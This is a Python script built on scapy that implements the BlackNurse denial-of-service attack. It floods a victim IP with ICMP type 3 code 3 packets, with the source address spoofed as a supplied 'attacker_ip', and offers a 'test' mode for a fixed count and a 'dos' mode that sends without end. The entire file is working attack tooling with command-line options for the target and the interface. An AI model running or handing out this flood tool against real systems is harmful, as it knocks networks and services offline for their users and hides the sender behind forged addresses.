#!/usr/bin/python3

from scapy.all import *
import sys
import argparse
from colorama import Fore

global GREEN, RED, YELLOW, MAGENTA, RESET
GREEN = Fore. GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET



conf.checkIpAddr = False # To stop scapy from checking return packet originating from any packet that we have sent out

def blacknurse(attack, attacker_ip, victim_ip, num_req):

    if attack == "test":
        print(GREEN + "[+] send "+str(num_req)+" ICMP packets (type 3 code 3) to " + victim_ip + " with attacker_ip" + attacker_ip + RESET)
        for i in range(0,num_req):
            send(IP(dst=victim_ip, src=attacker_ip)/ICMP(type=3, code=3), verbose=False, iface=net_interface)

    elif attack == "dos":
        print(GREEN + "[+] send continuously ICMP packets (type 3 code 3) to " + victim_ip + " with attacker_ip" + attacker_ip + RESET)
        while True:
            send(IP(dst=victim_ip, src=attacker_ip)/ICMP(type=3, code=3), verbose=False, iface=net_interface)


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", help="test/flood")
parser.add_argument("-a", "--attacker_ip", help="attacker ip")
parser.add_argument("-v", "--victim_ip", help="victim ip")
parser.add_argument("-N", "--num_req", help="number of request")
parser.add_argument("-I", "--interface", help="interface(eth0, ...)")
args = parser.parse_args()

if args.type:
    type_attack = args.type

    if type_attack == "test":
        if args.num_req:
            num_request = int(args.num_req)
        else:
            num_request = 5
    else:
        num_request = 0 # means infinity of requests

if args.attacker_ip:
    attacker_ip = args.attacker_ip

if args.victim_ip:
    victim_ip = args.victim_ip


global net_interface
if args.interface:
    net_interface = args.interface
else:
    net_interface = "eth0"

blacknurse(type_attack, attacker_ip, victim_ip, num_request)

sys.exit(1)
